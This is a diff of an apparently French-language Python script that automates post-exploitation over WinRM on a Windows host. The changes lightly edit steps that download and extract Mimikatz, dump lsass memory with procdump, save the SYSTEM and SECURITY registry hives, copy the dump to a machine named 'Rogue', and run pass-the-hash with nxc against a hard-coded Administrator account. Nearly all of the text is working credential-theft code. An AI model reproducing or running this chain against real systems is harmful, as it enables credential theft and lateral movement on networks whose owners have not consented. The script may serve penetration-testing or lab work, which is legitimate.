@@ -368,12 +368,14 @@ print(
     "***************************\n"
     + download_mimikatz.std_out.decode('utf-8')
 )
+"""
 print(
     "*************************\n"
     "Erreur Download Mimikatz:\n"
     "*************************\n"
     + download_mimikatz.std_err.decode('utf-8')
 )
+"""
 
 #==================
 # Extract Mimikatz:
@@ -383,7 +385,7 @@ print(
     "Lancement Extract Mimikatz:\n"
     "***************************\n"
 )
-extract_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Expand-Archive -Path "C:\\Users\\Public\\mimikatz.zip" -DestinationPath "C:\\Users\\Public\\mimikatz" | Out-String')
+extract_mimikatz = session_winrm.run_ps('[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; Expand-Archive -Path "C:\\Users\\Public\\mimikatz.zip" -DestinationPath "C:\\Users\\Public\\mimikatz" -F | Out-String')
 print(
     "**************************\n"
     "Résultat Extract Mimikatz:\n"
@@ -521,12 +523,14 @@ print(
     "*************************************\n"
     + telechargement_procdump_zip.std_out.decode('utf-8')
 )
+"""
 print(
     "***********************************\n"
     "Erreur téléchargement procdump.zip:\n"
     "***********************************\n"
     + telechargement_procdump_zip.std_err.decode('utf-8')
 )
+"""
 
 #========================
 # Unzipping procdump.zip:
@@ -581,6 +585,7 @@ print(
     "*********************\n"
 )
 dump_lsass = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; & "$env:TEMP\Procdump\procdump.exe" -accepteula -mm lsass.exe "$env:TEMP\lsass_dump.dmp" | Out-String')
+"""
 print(
     "********************\n"
     "Résultat dump lsass:\n"
@@ -593,6 +598,7 @@ print(
     "******************\n"
     + dump_lsass.std_err.decode('utf-8')
 )
+"""
 
 #=====================================
 # Copie fichier dump Windows to Rogue:
@@ -661,19 +667,19 @@ print(
 #======================================
 print(
     "***********************************************\n"
-    "Lancement backup ruche de registre HKLM\SYSTEM:\n"
+    r"Lancement backup ruche de registre HKLM\SYSTEM:\n"
     "***********************************************\n"
 )
 backup_ruche_registre_hklm_system = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; reg save HKLM\SYSTEM C:\Temp\SYSTEM | Out-String')
 print(
     "**********************************************\n"
-    "Résultat backup ruche de registre HKLM\SYSTEM:\n"
+    r"Résultat backup ruche de registre HKLM\SYSTEM:\n"
     "**********************************************\n"
     + backup_ruche_registre_hklm_system.std_out.decode('utf-8')
 )
 print(
     "********************************************\n"
-    "Erreur backup ruche de registre HKLM\SYSTEM:\n"
+    r"Erreur backup ruche de registre HKLM\SYSTEM:\n"
     "********************************************\n"
     + backup_ruche_registre_hklm_system.std_err.decode('utf-8')
 )
@@ -683,19 +689,19 @@ print(
 #========================================
 print(
     "*************************************************\n"
-    "Lancement backup ruche de registre HKLM\SECURITY:\n"
+    r"Lancement backup ruche de registre HKLM\SECURITY:\n"
     "*************************************************\n"
 )
 backup_ruche_registre_hklm_security = session_winrm.run_ps(r'[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; reg save HKLM\SECURITY C:\Temp\SECURITY | Out-String')
 print(
     "************************************************\n"
-    "Résultat backup ruche de registre HKLM\SECURITY:\n"
+    r"Résultat backup ruche de registre HKLM\SECURITY:\n"
     "************************************************\n"
     + backup_ruche_registre_hklm_security.std_out.decode('utf-8')
 )
 print(
     "**********************************************\n"
-    "Erreur backup ruche de registre HKLM\SECURITY:\n"
+    r"Erreur backup ruche de registre HKLM\SECURITY:\n"
     "**********************************************\n"
     + backup_ruche_registre_hklm_security.std_err.decode('utf-8')
 )
@@ -706,7 +712,7 @@ print(
 #========================================
 print(
     "*************************************************\n"
-    "Lancement export ruche de registre HKLM\SECURITY:\n"
+    r"Lancement export ruche de registre HKLM\SECURITY:\n"
     "*************************************************\n"
 )
 export_ruche_registre_hklm_security_command = r'''
@@ -717,13 +723,13 @@ cd C:\Users\Public;
 export_ruche_registre_hklm_security = session_winrm.run_ps(export_ruche_registre_hklm_security_command)
 print(
     "************************************************\n"
-    "Résultat export ruche de registre HKLM\SECURITY:\n"
+    r"Résultat export ruche de registre HKLM\SECURITY:\n"
     "************************************************\n"
     + export_ruche_registre_hklm_security.std_out.decode('cp1252')
 )
 print(
     "**********************************************\n"
-    "Erreur export ruche de registre HKLM\SECURITY:\n"
+    r"Erreur export ruche de registre HKLM\SECURITY:\n"
     "**********************************************\n"
     + export_ruche_registre_hklm_security.std_err.decode('cp1252')
 )
@@ -734,7 +740,7 @@ print(
 #======================================================
 print(
     "***************************************************************\n"
-    "Lancement export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
+    r"Lancement export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
     "***************************************************************\n"
 )
 export_ruche_registre_hkey_local_machine_security_command = r'''
@@ -745,13 +751,13 @@ cd C:\Users\Public;
 export_ruche_registre_hkey_local_machine_security = session_winrm.run_ps(export_ruche_registre_hkey_local_machine_security_command)
 print(
     "**************************************************************\n"
-    "Résultat export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
+    r"Résultat export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
     "**************************************************************\n"
     + export_ruche_registre_hkey_local_machine_security.std_out.decode('cp1252')
 )
 print(
     "************************************************************\n"
-    "Erreur export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
+    r"Erreur export ruche de registre HKEY_LOCAL_MACHINE\SECURITY:\n"
     "************************************************************\n"
     + export_ruche_registre_hkey_local_machine_security.std_err.decode('cp1252')
 )
@@ -789,6 +795,7 @@ print(
 #============================
 # Lancement crackmapexec SMB:
 #============================
+"""
 print(
     "***************************\n"
     "Lancement crackmapexec SMB:\n"
@@ -807,6 +814,32 @@ print(
     "************************\n"
     + crackmapexec_smb.stderr
 )
+"""
+
+#============================
+# Lancement NXC SMB:
+#============================
+print(
+    "******************\n"
+    "Lancement NXC SMB:\n"
+    "******************\n"
+)
+#nxc_smb = subprocess.run(["nxc smb -t 192.168.25.25 -u Administrator -H NTLMHASH"], shell=True, capture_output=True, text=True)
+nxc_smb = subprocess.run(["nxc smb 192.168.25.25 -u Administrator -H NTLMHASH"], shell=True, capture_output=True, text=True)
+print(
+    "*****************\n"
+    "Résultat NXC SMB:\n"
+    "*****************\n"
+    + nxc_smb.stdout
+)
+print(
+    "***************\n"
+    "Erreur NXC SMB:\n"
+    "***************\n"
+    + nxc_smb.stderr
+)
+
+
 
 
 
